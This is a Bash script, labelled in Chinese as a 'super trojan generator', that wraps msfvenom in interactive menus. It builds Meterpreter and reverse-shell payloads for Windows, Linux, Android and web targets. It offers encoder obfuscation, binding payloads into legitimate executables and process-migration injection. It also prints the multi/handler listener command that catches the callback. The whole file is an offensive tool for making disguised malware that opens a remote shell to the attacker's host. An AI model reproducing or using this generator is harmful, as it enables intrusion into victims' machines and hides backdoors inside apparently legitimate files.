#!/bin/bash
# 超级木马生成器 - 终极增强版 v5.5

draw_banner() {
    term_width=$(tput cols)
    border=$(printf '▄%.0s' $(seq 1 $((term_width/2))))
    echo -e "\033[1;35m$border\033[0m"
    echo -e "\033[1;35m█\033[38;5;213m$(printf ' %.0s' $(seq 1 $((term_width-4))))\033[1;35m█\033[0m"
    echo -e "\033[1;35m█\033[1;36m    ██╗    ██╗ █████╗  ██████╗██╗  ██╗██╗   ██╗██████╗ ██╗      █"
    echo -e "\033[1;35m█\033[1;36m    ██║    ██║██╔══██╗██╔════╝██║ ██╔╝██║   ██║██╔══██╗██║      █"
    echo -e "\033[1;35m█\033[1;36m    ██║ █╗ ██║███████║██║     █████╔╝ ██║   ██║██████╔╝██║      █"
    echo -e "\033[1;35m█\033[1;36m    ██║███╗██║██╔══██║██║     ██╔═██╗ ██║   ██║██╔═══╝ ██║      █"
    echo -e "\033[1;35m█\033[1;36m    ╚███╔███╔╝██║  ██║╚██████╗██║  ██╗╚██████╔╝██║     ███████╗ █"
    echo -e "\033[1;35m█\033[1;36m     ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝ █"
    echo -e "\033[1;35m█\033[38;5;213m$(printf ' %.0s' $(seq 1 $((term_width-4))))\033[1;35m█\033[0m"
    echo -e "\033[1;35m$border\033[0m"
}

validate_input() {
    while :; do
        read -p "$1" input
        [[ $input =~ ^[0-9]+$ ]] && ((input >= $2 && input <= $3)) && echo $input && return
        echo -e "\033[1;31m${4:-输入错误，请重新输入!}\033[0m" >&2
    done
}

select_ip() {
    mapfile -t ips < <(ip -o -4 addr show | awk '{gsub(/\/.*/,"");print $4}')
    (( ${#ips[@]} == 0 )) && echo -e "\033[1;31m✖ 未检测到可用IP地址!\033[0m" >&2 && exit 1

    echo -e "\n\033[1;33m可用IP地址:\033[0m" >&2
    for i in "${!ips[@]}"; do
        printf "\033[1;36m%2d) \033[1;32m%-15s\033[0m\n" $((i+1)) "${ips[i]}" >&2
    done
    local choice=$(validate_input $'\033[1;33m请选择IP (1-'${#ips[@]}$'): \033[0m' 1 ${#ips[@]})
    echo "${ips[choice-1]}"
}

generate_payload() {
    local lhost=$(select_ip)
    local lport=$(validate_input $'\033[38;5;228m监听端口 [默认4444]: \033[0m' 1 65535)
    lport=${lport:-4444}

    PS3=$'\033[38;5;228m请选择生成模式: \033[0m'
    select mode in "可执行文件" "Shellcode"; do
        case $mode in
        "可执行文件") generate_executable "$lhost" "$lport"; break ;;
        "Shellcode") generate_shellcode "$lhost" "$lport"; break ;;
        esac
    done
}

select_arch() {
    PS3="$1"
    select arch in "x86" "x64" "arm" "mips"; do
        [[ $arch == "x64" ]] && echo "x64" && return
        [[ $arch == "arm" ]] && echo "armle" && return
        [[ $arch == "mips" ]] && echo "mipsbe" && return
        echo "x86" && return
    done
}

select_payload() {
    local platform=$1
    local arch=$2
    PS3=$'\033[38;5;228m请选择Payload类型: \033[0m'
    
    case $platform in
    Windows)
        select pl in "meterpreter/reverse_tcp" "meterpreter/reverse_https" "meterpreter/reverse_http" "shell/reverse_tcp" "自定义Payload"; do
            [[ $pl == "自定义Payload" ]] && read -p $'\033[38;5;228m输入自定义Payload路径: \033[0m' pl
            echo "windows/$pl"
            return
        done ;;
    Linux)
        select pl in "meterpreter/reverse_tcp" "shell/reverse_tcp" "meterpreter/reverse_https" "自定义Payload"; do
            [[ $pl == "自定义Payload" ]] && read -p $'\033[38;5;228m输入自定义Payload路径: \033[0m' pl
            echo "linux/$pl"
            return
        done ;;
    Android)
        select pl in "meterpreter/reverse_tcp" "shell/reverse_tcp" "meterpreter/reverse_https" "自定义Payload"; do
            [[ $pl == "自定义Payload" ]] && read -p $'\033[38;5;228m输入自定义Payload路径: \033[0m' pl
            echo "android/$pl"
            return
        done ;;
    Web)
        select pl in "php/meterpreter/reverse_tcp" "php/reverse_tcp" "java/jsp_shell_reverse_tcp" "自定义Payload"; do
            if [[ $pl == "自定义Payload" ]]; then
                read -p $'\033[38;5;228m输入完整Payload路径 (格式为平台/类型，如php/meterpreter/reverse_tcp): \033[0m' pl
                echo "$pl"
            else
                echo "$pl"
            fi
            return
        done ;;
    esac
}

generate_executable() {
    local lhost=$1 lport=$2

    PS3=$'\033[38;5;228m请选择目标平台: \033[0m'
    select platform in "Windows" "Linux" "Android" "Web"; do
        case $platform in
        Windows) suggest_formats=("exe" "dll" "ps1") ;;
        Linux) suggest_formats=("elf" "sh") ;;
        Android) suggest_formats=("apk" "jar") ;;
        Web) suggest_formats=("raw" "war" "jsp") ;;
        esac
        break
    done

    local arch=""
    [[ $platform != "Web" ]] && arch=$(select_arch $'\033[38;5;228m请选择系统架构: \033[0m')
    
    local payload=$(select_payload $platform $arch)
    # 修复点：确保payload路径包含架构信息
    if [[ $platform != "Web" ]] && [[ $payload != *${arch}* ]]; then
        if [[ $payload == *meterpreter* ]]; then
            payload=$(echo "$payload" | sed "s#/#/${arch}/#")
        else
            payload=$(echo "$payload" | sed "s#/#/_${arch}/#")
        fi
    fi

    echo -e "\033[1;33m建议格式: ${suggest_formats[*]}\033[0m"
    read -p $'\033[38;5;228m输入格式 (默认第一个建议格式): \033[0m' format
    format=${format:-${suggest_formats[0]}}

    read -p $'\033[38;5;228m输入保存文件名: \033[0m' filename
    [[ -z "$filename" ]] && filename="payload_$(date +%s)"
    [[ ! $filename =~ \.${format}$ ]] && filename="${filename}.${format}"

    local extra_args=""
    read -p $'\033[38;5;228m编码器及参数 (例如 x86/shikata_ga_nai -b \'\\x00\' -i 5，默认无): \033[0m' encoder_args
    if [ -n "$encoder_args" ]; then
        extra_args+="$encoder_args "
    fi

    if [[ $platform == "Windows" && ($format == "exe" || $format == "dll") ]]; then
        read -p $'\033[38;5;228m捆绑合法文件? (y/n): \033[0m' bind_choice
        if [[ $bind_choice =~ [yY] ]]; then
            while :; do
                read -p $'\033[38;5;228m输入合法文件路径: \033[0m' bind_file
                [ -f "$bind_file" ] && extra_args+="-x \"$bind_file\" -k " && break
                echo -e "\033[1;31m文件不存在!\033[0m" >&2
            done
        fi
    fi

    read -p $'\033[38;5;228m注入参数 (如EXITFUNC=process PrependMigrate=true，多个参数用空格分隔): \033[0m' inject_args
    [ -n "$inject_args" ] && extra_args+="$inject_args "

    if [[ $platform == "Web" && $format == "php" ]]; then
        format="raw"
        echo -e "\033[1;33m[!] Web平台PHP类型自动使用raw格式，保存为.php文件\033[0m"
    fi

    local cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport $extra_args-f $format -o \"$filename\""
    execute_command "$cmd" "$filename" "$payload" "exec"
}

generate_shellcode() {
    local lhost=$1 lport=$2

    PS3=$'\033[38;5;228m请选择目标平台: \033[0m'
    select platform in "Windows" "Linux" "Android"; do
        break
    done

    local arch=$(select_arch $'\033[38;5;228m请选择系统架构: \033[0m')
    local payload=$(select_payload $platform $arch)
    payload=$(echo "$payload" | sed "s#/#/${arch}/#")

    PS3=$'\033[38;5;228m请选择输出格式: \033[0m'
    select sc_format in "raw" "csharp" "python" "ps1" "hex" "自定义"; do
        case $sc_format in
        "自定义")
            read -p $'\033[38;5;228m输入自定义格式: \033[0m' sc_format
            break
            ;;
        *)
            break
            ;;
        esac
    done

    PS3=$'\033[38;5;228m请选择输出方式: \033[0m'
    select format in "终端显示" "文件保存" "两者都要"; do
        case $format in
        "终端显示") output_mode="print" ;;
        "文件保存") output_mode="file" ;;
        "两者都要") output_mode="both" ;;
        esac
        break
    done

    read -p $'\033[38;5;228m注入参数 (如EXITFUNC=thread PrependMigrate=true，多个参数用空格分隔): \033[0m' inject_args
    local extra_args=""
    [ -n "$inject_args" ] && extra_args+="$inject_args "

    read -p $'\033[38;5;228m自定义文件名 (留空自动生成): \033[0m' filename
    [[ -z "$filename" ]] && filename="shellcode_$(date +%s).${sc_format}"

    local cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport $extra_args-f $sc_format"
    
    case $output_mode in
    "print")
        echo -e "\n\033[1;36m[+] 生成命令: \033[1;33m$cmd\033[0m"
        echo -e "\033[1;32m▼▼▼ Shellcode内容 ▼▼▼\033[0m"
        if [[ $sc_format == "hex" ]]; then
            eval "$cmd" 2>/dev/null | fold -w 60
        else
            eval "$cmd" 2>/dev/null
        fi
        echo -e "\033[1;32m▲▲▲ Shellcode结束 ▲▲▲\033[0m"
        ;;
    "file")
        cmd+=" -o \"$filename\""
        execute_command "$cmd" "$filename" "$payload" "shellcode"
        ;;
    "both")
        echo -e "\n\033[1;36m[+] 生成命令: \033[1;33m$cmd > $filename\033[0m"
        eval "$cmd" > "$filename" 2>&1
        echo -e "\033[1;32m▼▼▼ 文件内容 ▼▼▼\033[0m"
        if [[ $sc_format == "hex" ]]; then
            cat "$filename" | fold -w 60
        else
            cat "$filename"
        fi
        echo -e "\033[1;32m▲▲▲ 内容结束 ▲▲▲\033[0m"
        echo -e "\n\033[1;32m✔ 文件已保存至: \033[1;33m$filename\033[0m"
        ;;
    esac
}

execute_command() {
    echo -e "\n\033[1;36m[+] 生成命令: \033[1;33m$1\033[0m"
    if eval "$1"; then
        if [[ $4 == "exec" ]]; then
            echo -e "\n\033[1;32m✔ 生成成功! 文件保存为: \033[1;33m$2\033[0m"
            echo -e "\033[1;36m[!] 监听命令: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $3; set LHOST ${lhost}; set LPORT ${lport}; run'\033[0m"
        else
            echo -e "\033[1;32m✔ Shellcode已生成至: \033[1;33m$2\033[0m"
        fi
    else
        echo -e "\n\033[1;31m✖ 生成失败! 可能原因:\n   1. 参数冲突\n   2. 权限不足\n   3. 依赖缺失\n   4. 不支持的Payload格式组合\033[0m"
    fi
}

clear
draw_banner
generate_payload